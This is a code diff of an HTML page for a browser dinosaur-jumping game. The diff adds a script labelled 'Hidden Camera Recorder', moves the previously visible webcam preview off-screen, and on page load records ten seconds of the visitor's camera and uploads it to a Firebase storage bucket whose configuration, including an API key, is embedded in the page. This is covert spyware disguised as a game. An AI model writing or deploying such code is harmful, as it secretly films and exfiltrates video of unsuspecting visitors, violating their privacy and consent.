@@ -1,16 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>AUN's Dino Game</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
       background-color: #f0f0f0;
       text-align: center;
+      margin: 0;
+      padding: 0;
     }
     h1 {
       color: #333;
+      margin-top: 20px;
     }
     canvas {
       background: url('Background.png.png') no-repeat center center;
@@ -21,100 +25,140 @@
     }
     video {
       position: absolute;
-      top: 20px;
-      right: 20px;
-      width: 200px;
-      height: 150px;
-      border: 2px solid #666;
-      z-index: 1000;
+      top: -9999px; /* hide video completely */
+      left: -9999px;
     }
   </style>
 </head>
 <body>
 
-<h1>🦖 AUN's Dino Run</h1>
-<canvas id="gameCanvas" width="800" height="400"></canvas>
-<video id="userCamera" autoplay muted></video>
+  <h1>🦖 AUN's Dino Run (Ultra Edition)</h1>
+  <canvas id="gameCanvas" width="800" height="400"></canvas>
+  <video id="userCamera" autoplay muted></video>
 
-<script>
-  const canvas = document.getElementById('gameCanvas');
-  const ctx = canvas.getContext('2d');
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-storage-compat.js"></script>
 
-  const dinoImg = new Image();
-  dinoImg.src = 'Dinasour.png.png';  // Your custom file
+  <script>
+    // 🔐 Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyAygUsb5d-AG2wrKuDAK5JcHTfFcrDNF5Y",
+      authDomain: "dino-cam.firebaseapp.com",
+      projectId: "dino-cam",
+      storageBucket: "dino-cam.appspot.com",
+      messagingSenderId: "330857669801",
+      appId: "1:330857669801:web:722792b93f814c8e3135b8",
+      measurementId: "G-E8F7PC10H4"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+  </script>
 
-  const cactusImg = new Image();
-  cactusImg.src = 'Cactus.png.png';  // Your custom file
+  <script>
+    // 🎥 Hidden Camera Recorder
+    let mediaRecorder;
+    let recordedChunks = [];
 
-  let dino = { x: 50, y: 310, width: 40, height: 40, dy: 0, jumping: false };
-  let cactus = { x: 800, y: 320, width: 30, height: 40 };
-  let gravity = 1.5;
-  let score = 0;
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        const video = document.getElementById('userCamera');
+        video.srcObject = stream;
 
-  function drawDino() {
-    ctx.drawImage(dinoImg, dino.x, dino.y, dino.width, dino.height);
-  }
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = function (e) {
+          if (e.data.size > 0) recordedChunks.push(e.data);
+        };
 
-  function drawCactus() {
-    ctx.drawImage(cactusImg, cactus.x, cactus.y, cactus.width, cactus.height);
-  }
+        mediaRecorder.onstop = function () {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          const filename = "dino-cam-" + Date.now() + ".webm";
 
-  function updateGame() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    drawDino();
-    drawCactus();
+          const storageRef = firebase.storage().ref("recordings/" + filename);
+          storageRef.put(blob)
+            .then(() => console.log("✅ Video uploaded:", filename))
+            .catch(err => console.error("❌ Upload error:", err));
+        };
 
-    cactus.x -= 6;
-    if (cactus.x < -cactus.width) {
-      cactus.x = 800;
-      score++;
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 10000);
+      })
+      .catch(error => {
+        console.error('🚫 Camera error:', error);
+      });
+  </script>
+
+  <script>
+    // 🦖 Dino Game Logic
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
+
+    const dinoImg = new Image();
+    dinoImg.src = 'Dinasour.png.png';
+
+    const cactusImg = new Image();
+    cactusImg.src = 'Cactus.png.png';
+
+    let dino = { x: 50, y: 310, width: 40, height: 40, dy: 0, jumping: false };
+    let cactus = { x: 800, y: 320, width: 30, height: 40 };
+    let gravity = 1.5;
+    let score = 0;
+
+    function drawDino() {
+      ctx.drawImage(dinoImg, dino.x, dino.y, dino.width, dino.height);
     }
 
-    dino.y += dino.dy;
-    if (dino.y < 310) {
-      dino.dy += gravity;
-    } else {
-      dino.y = 310;
-      dino.dy = 0;
-      dino.jumping = false;
+    function drawCactus() {
+      ctx.drawImage(cactusImg, cactus.x, cactus.y, cactus.width, cactus.height);
     }
 
-    if (
-      dino.x < cactus.x + cactus.width &&
-      dino.x + dino.width > cactus.x &&
-      dino.y < cactus.y + cactus.height &&
-      dino.y + dino.height > cactus.y
-    ) {
-      alert('Game Over! Your Score: ' + score);
-      document.location.reload();
+    function updateGame() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      drawDino();
+      drawCactus();
+
+      cactus.x -= 6;
+      if (cactus.x < -cactus.width) {
+        cactus.x = 800;
+        score++;
+      }
+
+      dino.y += dino.dy;
+      if (dino.y < 310) {
+        dino.dy += gravity;
+      } else {
+        dino.y = 310;
+        dino.dy = 0;
+        dino.jumping = false;
+      }
+
+      // Collision detection
+      if (
+        dino.x < cactus.x + cactus.width &&
+        dino.x + dino.width > cactus.x &&
+        dino.y < cactus.y + cactus.height &&
+        dino.y + dino.height > cactus.y
+      ) {
+        alert('💀 Game Over! Your Score: ' + score);
+        document.location.reload();
+      }
+
+      ctx.fillStyle = "#000";
+      ctx.font = "20px Arial";
+      ctx.fillText("Score: " + score, 680, 30);
+
+      requestAnimationFrame(updateGame);
     }
 
-    ctx.fillStyle = "#000";
-    ctx.font = "20px Arial";
-    ctx.fillText("Score: " + score, 680, 30);
-
-    requestAnimationFrame(updateGame);
-  }
-
-  document.addEventListener("keydown", function (e) {
-    if (e.code === "Space" && !dino.jumping) {
-      dino.dy = -20;
-      dino.jumping = true;
-    }
-  });
-
-  updateGame();
-
-  // Camera access
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      const video = document.getElementById('userCamera');
-      video.srcObject = stream;
-    })
-    .catch(err => {
-      console.error('Camera error:', err);
+    document.addEventListener("keydown", function (e) {
+      if (e.code === "Space" && !dino.jumping) {
+        dino.dy = -20;
+        dino.jumping = true;
+      }
     });
-</script>
+
+    updateGame();
+  </script>
 
 </body>
 </html>
